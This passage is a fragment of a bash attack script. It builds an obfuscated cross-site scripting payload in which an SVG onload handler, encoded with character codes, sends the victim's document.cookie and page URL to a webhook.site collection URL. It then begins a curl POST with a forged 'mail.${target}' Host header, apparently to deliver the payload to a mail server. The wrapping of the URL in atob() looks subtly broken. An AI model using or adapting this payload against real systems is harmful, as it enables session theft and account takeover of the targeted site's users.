        local xss_payload="<svg onload=fetch(atob(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47))+btoa(document.cookie)+String.fromCharCode(38,117,114,108,61)+location.href)>"
        local resp=$(curl -sk --max-time 15 -X POST -H "Host: mail.${target}" -H "Content-Type: text/xml" \
